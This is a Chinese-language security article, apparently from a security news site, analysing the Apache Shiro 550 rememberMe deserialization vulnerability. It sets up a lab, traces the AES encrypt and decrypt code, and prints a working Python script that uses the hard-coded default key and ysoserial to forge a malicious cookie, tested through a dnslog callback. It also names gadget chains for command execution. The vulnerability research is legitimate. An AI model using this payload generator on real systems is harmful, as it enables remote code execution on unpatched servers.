# Java安全之Shiro 550反序列化漏洞分析

阅读量 **321774**

|评论 **2**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-12-24 10:00:11

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t014ac313fdc963af46.jpg)

## 0x00 前言

在近些时间基本都能在一些渗透或者是攻防演练中看到Shiro的身影，也是Shiro的该漏洞也是用的比较频繁的漏洞。本文对该Shiro550
反序列化漏洞进行一个分析，了解漏洞产生过程以及利用方式。

## 0x01 漏洞原理

Shiro 550 反序列化漏洞存在版本：shiro
<1.2.4，产生原因是因为shiro接受了Cookie里面`rememberMe`的值，然后去进行Base64解密后，再使用aes密钥解密后的数据，进行反序列化。

反过来思考一下，如果我们构造该值为一个cc链序列化后的值进行该密钥aes加密后进行base64加密，那么这时候就会去进行反序列化我们的payload内容，这时候就可以达到一个命令执行的效果。

    
    
    获取rememberMe值 -> Base64解密 -> AES解密 -> 调用readobject反序列化操作
    

## 0x02 漏洞环境搭建

漏洞环境：<https://codeload.github.com/apache/shiro/zip/shiro-root-1.2.4>

打开shiro/web目录，对pom.xml进行配置依赖配置一个cc4和jstl组件进来，后面再去说为什么shiro自带了`commons-collections:3.2.1`还要去手工配置一个`commons-collections:4.0`。

    
    
        <properties>
    
        <maven.compiler.source>1.6</maven.compiler.source>
    
        <maven.compiler.target>1.6</maven.compiler.target>
    
        </properties>
    
    ...
    <dependency>
                <groupId>javax.servlet</groupId>
                <artifactId>jstl</artifactId>
                <!--  这里需要将jstl设置为1.2 -->
                <version>1.2</version>
                <scope>runtime</scope>
            </dependency>
            <dependency>
                <groupId>org.apache.commons</groupId>
                <artifactId>commons-collections4</artifactId>
                <version>4.0</version>
            </dependency>
    

###  坑点

Shiro的编译太痛苦了，各种坑，下面来排一下坑。

配置`maven\conf\toolchains.xml`，这里需要指定JDK1.6的路径和版本，编译必须要1.6版本，但不影响在其他版本下运行。

    
    
    <?xml version="1.0" encoding="UTF-8"?>
    <toolchains xmlns="http://maven.apache.org/TOOLCHAINS/1.1.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xsi:schemaLocation="http://maven.apache.org/TOOLCHAINS/1.1.0 http://maven.apache.org/xsd/toolchains-1.1.0.xsd">
      <toolchain>
        <type>jdk</type>
        <provides>
          <version>1.6</version>
          <vendor>sun</vendor>
        </provides>
        <configuration>
          <jdkHome>D:\JAVA_JDK\jdk1.6</jdkHome>
        </configuration>
      </toolchain>
    </toolchains>
    

这些都完成后进行编译。

    
    
    Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:2.0.2:testCompile (default-testCompile) on project samples-web: Compilation failure
    

这里还是报错了。

后面编译的时候，切换成了maven3.1.1的版本。然后就可以编译成功了。

![](https://p4.ssl.qhimg.com/t0190af93cb9438c83a.png)

但是后面又发现部署的时候访问不到，编译肯定又出了问题。

后面把这两个里面的`<scope>`标签给注释掉，然后就可以了。

![](https://p1.ssl.qhimg.com/t01ce8b70f2370a6382.png)

把pom.xml配置贴一下。

    
    
    <?xml version="1.0" encoding="UTF-8"?>
    <!--      ~ Licensed to the Apache Software Foundation (ASF) under one
      ~ or more contributor license agreements.  See the NOTICE file
      ~ distributed with this work for additional information
      ~ regarding copyright ownership.  The ASF licenses this file
      ~ to you under the Apache License, Version 2.0 (the
      ~ "License"); you may not use this file except in compliance
      ~ with the License.  You may obtain a copy of the License at
      ~
      ~     http://www.apache.org/licenses/LICENSE-2.0
      ~
      ~ Unless required by applicable law or agreed to in writing,
      ~ software distributed under the License is distributed on an
      ~ "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
      ~ KIND, either express or implied.  See the License for the
      ~ specific language governing permissions and limitations
      ~ under the License.
      -->
    <!--suppress osmorcNonOsgiMavenDependency -->
    <project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd">
        <properties>
    
            <maven.compiler.source>1.6</maven.compiler.source>
    
            <maven.compiler.target>1.6</maven.compiler.target>
    
        </properties>
        <parent>
            <groupId>org.apache.shiro.samples</groupId>
            <artifactId>shiro-samples</artifactId>
            <version>1.2.4</version>
            <relativePath>../pom.xml</relativePath>
        </parent>
    
        <modelVersion>4.0.0</modelVersion>
        <artifactId>samples-web</artifactId>
        <name>Apache Shiro :: Samples :: Web</name>
        <packaging>war</packaging>
    
        <build>
            <plugins>
                <plugin>
                    <artifactId>maven-surefire-plugin</artifactId>
                    <configuration>
                        <forkMode>never</forkMode>
                    </configuration>
                </plugin>
                <plugin>
                    <groupId>org.mortbay.jetty</groupId>
                    <artifactId>maven-jetty-plugin</artifactId>
                    <version>${jetty.version}</version>
                    <configuration>
                        <contextPath>/</contextPath>
                        <connectors>
                            <connector implementation="org.mortbay.jetty.nio.SelectChannelConnector">
                                <port>9080</port>
                                <maxIdleTime>60000</maxIdleTime>
                            </connector>
                        </connectors>
                        <requestLog implementation="org.mortbay.jetty.NCSARequestLog">
                            <filename>./target/yyyy_mm_dd.request.log</filename>
                            <retainDays>90</retainDays>
                            <append>true</append>
                            <extended>false</extended>
                            <logTimeZone>GMT</logTimeZone>
                        </requestLog>
                    </configuration>
                </plugin>
            </plugins>
        </build>
    
        <dependencies>
            <dependency>
                <groupId>javax.servlet</groupId>
                <artifactId>jstl</artifactId>
                <scope>runtime</scope>
            </dependency>
            <dependency>
                <groupId>javax.servlet</groupId>
                <artifactId>servlet-api</artifactId>
    <!--            <scope>provided</scope>-->
            </dependency>
            <dependency>
                <groupId>org.slf4j</groupId>
                <artifactId>slf4j-log4j12</artifactId>
                <scope>runtime</scope>
            </dependency>
            <dependency>
                <groupId>log4j</groupId>
                <artifactId>log4j</artifactId>
                <scope>runtime</scope>
            </dependency>
            <dependency>
                <groupId>net.sourceforge.htmlunit</groupId>
                <artifactId>htmlunit</artifactId>
                <version>2.6</version>
    <!--            <scope>test</scope>-->
            </dependency>
            <dependency>
                <groupId>org.apache.shiro</groupId>
                <artifactId>shiro-core</artifactId>
            </dependency>
            <dependency>
                <groupId>org.apache.shiro</groupId>
                <artifactId>shiro-web</artifactId>
            </dependency>
            <dependency>
                <groupId>org.mortbay.jetty</groupId>
                <artifactId>jetty</artifactId>
                <version>${jetty.version}</version>
                <scope>test</scope>
            </dependency>
            <dependency>
                <groupId>org.mortbay.jetty</groupId>
                <artifactId>jsp-2.1-jetty</artifactId>
                <version>${jetty.version}</version>
                <scope>test</scope>
            </dependency>
            <dependency>
                <groupId>org.slf4j</groupId>
                <artifactId>jcl-over-slf4j</artifactId>
                <scope>runtime</scope>
            </dependency>
            <dependency>
                <groupId>javax.servlet</groupId>
                <artifactId>jstl</artifactId>
                <!--  这里需要将jstl设置为1.2 -->
                <version>1.2</version>
                <scope>runtime</scope>
            </dependency>
            <dependency>
                <groupId>org.apache.commons</groupId>
                <artifactId>commons-collections4</artifactId>
                <version>4.0</version>
            </dependency>
        </dependencies>
    
    
    </project>
    

经过2天的排坑，终于把这个坑给解决掉，这里必须贴几张照片庆祝庆祝。

![](https://p2.ssl.qhimg.com/t01d20135e7f983b5af.png)

![](https://p3.ssl.qhimg.com/t010c3ba6a0ab787381.png)

输入账号密码，勾选Remerber me选项。进行抓包

![](https://p5.ssl.qhimg.com/t01113ae39ce9800725.png)

下面就可以来分析该漏洞了。

## 0x03 漏洞分析

###  加密

漏洞产生点在`CookieRememberMeManager`该位置，来看到`rememberSerializedIdentity`方法。

该方法的作用为使用Base64对指定的序列化字节数组进行编码，并将Base64编码的字符串设置为cookie值。

那么我们就去查看一下该方法在什么地方被调用。

![](https://p2.ssl.qhimg.com/t016bf60398bcf21e0d.png)

在这可以看到该类继承的`AbstractRememberMeManager`类调用了该方法。跟进进去查看

![](https://p0.ssl.qhimg.com/t01a197aeb3b271dbe5.png)

发现这个方法被`rememberIdentity`方法给调用了，同样方式继续跟进。

![](https://p5.ssl.qhimg.com/t016cd0789336007080.png)

在这里会发现`rememberIdentity`方法会被`onSuccessfulLogin`方法给调用，跟踪到这一步，就看到了`onSuccessfulLogin`登录成功的方法。

当登录成功后会调用`AbstractRememberMeManager.onSuccessfulLogin`方法，该方法主要实现了生成加密的`RememberMe
Cookie`,然后将`RememberMe
Cookie`设置为用户的Cookie值。在前面我们分析的`rememberSerializedIdentity`方法里面去实现了。可以来看一下这段代码。

![](https://p3.ssl.qhimg.com/t01d2e8894e2afa8bdb.png)

回到`onSuccessfulLogin`这个地方，打个断点，然后web登录页面输入root/secret
口令进行提交，再回到IDEA中查看。找到登录成功方法后，我们可以来正向去做个分析，不然刚刚的方式比较麻烦。

![](https://p1.ssl.qhimg.com/t016d68d54699289895.png)

这里看到调用了`isRememberMe`很显而易见得发现这个就是一个判断用户是否选择了`Remember Me`选项。

![](https://p3.ssl.qhimg.com/t01526ad3242a9a52da.png)

如果选择`Remember Me`功能的话返回true，如果不选择该选项则是调用log.debug方法在控制台输出一段字符。

这里如果为true的话就会调用`rememberIdentity`方法并且传入三个参数。F7跟进该方法。

![](https://p1.ssl.qhimg.com/t01508d6ad02cbe54c5.png)

前面说过该方法会去生成一个`PrincipalCollection`对象，里面包含登录信息。F7进行跟进`rememberIdentity`方法。

![](https://p0.ssl.qhimg.com/t0119b120c687066ce8.png)

查看`convertPrincipalsToBytes`具体的实现与作用。

![](https://p4.ssl.qhimg.com/t01f4aac668d4f09c0f.png)

![](https://p2.ssl.qhimg.com/t01fe57ecc5107cf4f7.png)

跟进该方法查看具体实现。

![](https://p3.ssl.qhimg.com/t01afbfb0736256469f.png)

看到这里其实已经很清晰了，进行了一个序列化，然后返回序列化后的Byte数组。

再来看到下一段代码，这里如果`getCipherService`方法不为空的话，就会去执行下一段代码。`getCipherService`方法是获取加密模式。

![](https://p5.ssl.qhimg.com/t0162415dd160f4c557.png)

![](https://p3.ssl.qhimg.com/t01fd852b200109b2d5.png)

还是继续跟进查看。

![](https://p1.ssl.qhimg.com/t01fa518d0ae2bdb21b.png)

![](https://p3.ssl.qhimg.com/t01480220f248279d98.png)

查看调用，会发现在构造方法里面对该值进行定义。

![](https://p3.ssl.qhimg.com/t0114bf0572ab9afd94.png)

完成这一步后，就来到了这里。

![](https://p1.ssl.qhimg.com/t01a8b2c13b2ffb5f26.png)

调用`encrypt`方法，对序列化后的数据进行处理。继续跟进。

![](https://p3.ssl.qhimg.com/t018f1be15a94643869.png)

这里调用`cipherService.encrypt`方法并且传入序列化数据，和`getEncryptionCipherKey`方法。

![](https://p4.ssl.qhimg.com/t01f63b0f69bc42e646.png)

`getEncryptionCipherKey`从名字上来看是获取密钥的方法，查看一下，是怎么获取密钥的。

![](https://p1.ssl.qhimg.com/t01a993ae9e1309908b.png)

![](https://p1.ssl.qhimg.com/t0158a5e81766a2d6df.png)

查看调用的时候，发现`setCipherKey`方法在构造方法里面被调用了。

![](https://p0.ssl.qhimg.com/t01f83e6cc1272e7c8a.png)

查看`DEFAULT_CIPHER_KEY_BYTES`值会发现里面定义了一串密钥

![](https://p4.ssl.qhimg.com/t017822c7cc7fbdbc1a.png)

而这个密钥是定义死的。

返回刚刚的加密的地方。

![](https://p1.ssl.qhimg.com/t01650b324063e82485.png)

这个地方选择跟进，查看具体实现。

![](https://p5.ssl.qhimg.com/t019f39ef83f56f3ce1.png)

查看到这里发现会传入前面序列化的数组和key值，最后再去调用他的重载方法并且传入序列化数组、key、ivBytes值、generate。

iv的值由`generateInitializationVector`方法生成，进行跟进。

![](https://p2.ssl.qhimg.com/t01545b84f7b4208bf1.png)

![](https://p1.ssl.qhimg.com/t01f2d33e6737434434.png)

查看`getDefaultSecureRandom`方法实现。

![](https://p4.ssl.qhimg.com/t01e1cd9e05dabdd405.png)

![](https://p4.ssl.qhimg.com/t0170d51bc01f26c465.png)

![](https://p3.ssl.qhimg.com/t0162d1e553e4a68ab2.png)

返回`generateInitializationVector`方法继续查看。这个new了一个byte数组长度为16

![](https://p2.ssl.qhimg.com/t01ff30ff27270474ee.png)

最后得到这个ivBytes值进行返回。

这里执行完成后就拿到了ivBytes的值了，这里再回到加密方法的地方查看具体加密的实现。

![](https://p1.ssl.qhimg.com/t0184fa13d356945465.png)

这里调用crypt方法进行获取到加密后的数据，而这个output是一个byte数组，大小是加密后数据的长度加上iv这个值的长度。

####  iv 的小tips

  * 某些加密算法要求明文需要按一定长度对齐，叫做块大小(BlockSize)，我们这次就是16字节，那么对于一段任意的数据，加密前需要对最后一个块填充到16 字节，解密后需要删除掉填充的数据。
  * AES中有三种填充模式(PKCS7Padding/PKCS5Padding/ZeroPadding)
  * PKCS7Padding跟PKCS5Padding的区别就在于数据填充方式，PKCS7Padding是缺几个字节就补几个字节的0，而PKCS5Padding是缺几个字节就补充几个字节的几，好比缺6个字节，就补充6个字节

不了解加密算法的可以看[Java安全之安全加密算法](https://www.cnblogs.com/nice0e3/p/13894507.html)

在执行完成后序列化的数据已经被进行了AES加密，返回一个byte数组。

![](https://p5.ssl.qhimg.com/t0169eedfd6d1b173d6.png)

执行完成后，来到这一步，然后进行跟进。

![](https://p0.ssl.qhimg.com/t011cc9b22266960fd7.png)

到了这里其实就没啥好说的了。后面的步骤就是进行base64加密后设置为用户的Cookie的rememberMe字段中。

###  解密

由于我们并不知道哪个方法里面去实现这么一个功能。但是我们前面分析加密的时候，调用了`AbstractRememberMeManager.encrypt`进行加密，该类中也有对应的解密操作。那么在这里就可以来查看该方法具体会在哪里被调用到，就可以追溯到上层去，然后进行下断点。

![](https://p4.ssl.qhimg.com/t011f62200e8df07626.png)

![](https://p0.ssl.qhimg.com/t01ce7d96020afc9f59.png)

查看 `getRememberedPrincipals`方法在此处下断点

![](https://p4.ssl.qhimg.com/t01d31aa583d6a74be5.png)

跟踪

![](https://p2.ssl.qhimg.com/t01382ba59bf8063a9a.png)

返回`getRememberedPrincipals`方法。

![](https://p3.ssl.qhimg.com/t01d1391ae9029f8a40.png)

在下面调用了`convertBytesToPrincipals`方法，进行跟踪。

![](https://p1.ssl.qhimg.com/t0148e79599c25e6cd9.png)

查看`decrypt`方法具体实现。

![](https://p4.ssl.qhimg.com/t01cc7bcb036c7d3658.png)

和前面的加密步骤类似，这里不做详细讲解。

![](https://p4.ssl.qhimg.com/t01e972cb027d7ed9f9.png)

生成iv值，然后传入到他的重载方法里面。

![](https://p4.ssl.qhimg.com/t0196670495170410de.png)

到了这里执行完后，就进行了AES的解密完成。

还是回到这一步。

![](https://p5.ssl.qhimg.com/t012341d45f71f15a4b.png)

这里返回了`deserialize`方法的返回值，并且传入AES加密后的数据。

进行跟踪该方法。

![](https://p3.ssl.qhimg.com/t01e323dd1fd65b327d.png)

继续跟踪。

![](https://p2.ssl.qhimg.com/t012772cdaa37a0c792.png)

到了这步，就会对我们传入进来的AES解密后的数据进行调用`readObject`方法进行反序列化操作。

## 0x04 漏洞攻击

###  漏洞探测

现在已经知道了是因为获取rememberMe值，然后进行解密后再进行反序列化操作。

那么在这里如果拿到了密钥就可以伪造加密流程。

网上找的一个加密的脚本

    
    
    # －*-* coding:utf-8
    # @Time    :  2020/10/16 17:36
    # @Author  : nice0e3
    # @FileName: poc.py
    # @Software: PyCharm
    # @Blog    ：https://www.cnblogs.com/nice0e3/
    import base64
    import uuid
    import subprocess
    from Crypto.Cipher import AES
    
    
    def rememberme(command):
        # popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'URLDNS', command], stdout=subprocess.PIPE)
        popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', 'URLDNS', command],
                                 stdout=subprocess.PIPE)
        # popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.6-SNAPSHOT-all.jar', 'JRMPClient', command], stdout=subprocess.PIPE)
        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        key = "kPH+bIxk5D2deZiIxcaaaA=="
        mode = AES.MODE_CBC
        iv = uuid.uuid4().bytes
        encryptor = AES.new(base64.b64decode(key), mode, iv)
        file_body = pad(popen.stdout.read())
        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
        return base64_ciphertext
    
    
    if __name__ == '__main__':
        # payload = encode_rememberme('127.0.0.1:12345')
        # payload = rememberme('calc.exe')
        payload = rememberme('http://u89cy6.dnslog.cn')
        with open("./payload.cookie", "w") as fpw:
    
            print("rememberMe={}".format(payload.decode()))
            res = "rememberMe={}".format(payload.decode())
            fpw.write(res)
    

获取到值后加密后的payload后可以在burp上面进行手工发送测试一下。

![](https://p5.ssl.qhimg.com/t018adf011fa306e438.png)

发送完成后，就可以看到DNSLOG平台上面回显了。

![](https://p3.ssl.qhimg.com/t015ad3d4e26251931a.png)

当使用URLDNS链的打过去，在DNSLOG平台有回显的时候，就说明这个地方存在反序列化漏洞。

但是要利用的话还得是使用CC链等利用链去进行命令的执行。

###  漏洞利用

前面我们手动给shio配上cc4的组件，而shiro中自带的是cc3.2.1版本的组件，为什么要手工去配置呢？

其实shiro中重写了`ObjectInputStream`类的`resolveClass`函数，`ObjectInputStream`的`resolveClass`方法用的是`Class.forName`类获取当前描述器所指代的类的Class对象。而重写后的`resolveClass`方法，采用的是`ClassUtils.forName`。查看该方法

    
    
    public static Class forName(String fqcn) throws UnknownClassException {
        Class clazz = THREAD_CL_ACCESSOR.loadClass(fqcn);
        if (clazz == null) {
            if (log.isTraceEnabled()) {
                log.trace("Unable to load class named [" + fqcn + "] from the thread context ClassLoader.  Trying the current ClassLoader...");
            }
    
            clazz = CLASS_CL_ACCESSOR.loadClass(fqcn);
        }
    
        if (clazz == null) {
            if (log.isTraceEnabled()) {
                log.trace("Unable to load class named [" + fqcn + "] from the current ClassLoader.  " + "Trying the system/application ClassLoader...");
            }
    
            clazz = SYSTEM_CL_ACCESSOR.loadClass(fqcn);
        }
    
        if (clazz == null) {
            String msg = "Unable to load class named [" + fqcn + "] from the thread context, current, or " + "system/application ClassLoaders.  All heuristics have been exhausted.  Class could not be found.";
            throw new UnknownClassException(msg);
        } else {
            return clazz;
        }
    }
    

在传参的地方如果传入一个`Transform`数组的参数，会报错。

后者并不支持传入数组类型。

那么在这里可以使用cc2和cc4的利用链去进行命令执行，因为这两个都是基于javassist去实现的，而不是基于`Transform`数组。具体的可以看前面我的分析利用链文章。

除了这两个其实在部署的时候，可以发现组件当中自带了一个CommonsBeanutils的组件，这个组件也是有利用链的。可以使用CommonsBeanutils这条利用链进行命令执行。

那么除了这些方式就没有了嘛？假设没有cc4的组件，就一定执行不了命令了嘛？其实方式还是有的。wh1t3p1g师傅在[文章](https://www.anquanke.com/post/id/192619)中已经给出了解决方案。需要重新去特殊构造一下利用链。

###  参考文章

    
    
    https://www.anquanke.com/post/id/192619#h2-4
    
    https://payloads.info/2020/06/23/Java%E5%AE%89%E5%85%A8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87-Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/#Commons-beanutils
    
    https://zeo.cool/2020/09/03/Shiro%20550%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90+poc%E7%BC%96%E5%86%99/#%E5%9D%91%E7%82%B9%EF%BC%9A
    

## 0x05 结尾

在该漏洞中我觉得只要的难点在于环境搭建上费了不少时间，还有的就是关于shiro中大部分利用链没法使用的解决。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **奶思** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/225442](/post/id/225442)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)

 **+1** __6赞

 __收藏

![](https://p4.ssl.qhimg.com/t010f571daeba245bf5.png) 奶思

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

